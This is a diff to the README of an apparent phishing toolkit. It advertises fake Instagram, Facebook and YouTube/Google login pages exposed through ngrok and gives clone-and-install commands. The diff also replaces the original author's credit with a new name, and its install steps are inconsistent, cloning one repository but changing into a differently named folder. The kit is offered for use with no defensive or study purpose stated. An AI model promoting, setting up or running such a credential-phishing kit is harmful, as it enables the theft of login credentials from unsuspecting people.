@@ -36,7 +36,7 @@ Version 1.0.0 Created By temirovazat
 </p>
 
 
--=Features=-
+**Features**
 - Fake Instagram Phishing Page
 - Fake FaceBook Phishing Page
 - Fake YouTube Login(Google) Phishing Page
@@ -46,17 +46,17 @@ Version 1.0.0 Created By temirovazat
 - Empty Phsihing Page
   - ngrok
 
--=Operating Systems Tested=-
+**Operating Systems Tested**
 - ubuntu 20.04.3 LTS
 
--=Credit & Help=-
-- Copyright © 2021 by FireKing255
-- Telegram: @Fireking255
-- Github: https://github.com/fireking255/
+**Credit & Help**
+- Copyright © 2021 by temirovazat
+- Telegram: @temirovazat
+- Github: https://github.com/temirovazat/
 - For Any Issue Read Errors.txt
 
 ```bash
-$ git clone https://github.com/FireKing255/Excalibur
+$ git clone https://github.com/BlacksCrows/Phishing-Crack
 $ cd Excalibur
 $ sudo bash install.sh
 $ python3 -m pip install -r requirments.txt
